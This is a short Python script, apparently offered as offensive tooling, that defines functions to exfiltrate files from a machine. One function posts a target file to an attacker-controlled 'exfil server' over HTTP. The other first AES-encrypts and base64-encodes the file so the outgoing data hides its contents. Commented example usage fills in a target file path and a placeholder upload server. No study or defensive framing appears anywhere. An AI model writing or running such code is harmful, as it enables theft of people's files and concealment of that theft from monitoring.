import requests
import os
from Crypto.Cipher import AES
import base64

# Basic HTTP Exfiltration
def exfiltrate_via_http(file_path, exfil_server_url):
    try:
        with open(file_path, 'rb') as f:
            files = {'file': f}
            response = requests.post(exfil_server_url, files=files)
            if response.status_code == 200:
                print(f"File {file_path} successfully exfiltrated to {exfil_server_url}")
            else:
                print(f"Failed to exfiltrate file {file_path}")
    except Exception as e:
        print(f"Error during exfiltration: {e}")

# Encrypted Exfiltration
def encrypt_file(file_path, key):
    cipher = AES.new(key, AES.MODE_CFB)
    with open(file_path, 'rb') as f:
        plaintext = f.read()
    ciphertext = cipher.encrypt(plaintext)
    encrypted_data = base64.b64encode(ciphertext).decode('utf-8')
    return encrypted_data

def exfiltrate_encrypted(file_path, key, exfil_server_url):
    try:
        encrypted_data = encrypt_file(file_path, key)
        response = requests.post(exfil_server_url, data={'file': encrypted_data})
        if response.status_code == 200:
            print(f"Encrypted file {file_path} successfully exfiltrated to {exfil_server_url}")
        else:
            print(f"Failed to exfiltrate file {file_path}")
    except Exception as e:
        print(f"Error during encrypted exfiltration: {e}")

# Example usage
# file_path = "C:/path/to/target/file.txt"
# exfil_server_url = "http://your-server.com/upload"
# key = b'Sixteen byte key'
# exfiltrate_via_http(file_path, exfil_server_url)  # Basic HTTP exfiltration
# exfiltrate_encrypted(file_path, key, exfil_server_url)  # Encrypted exfiltration
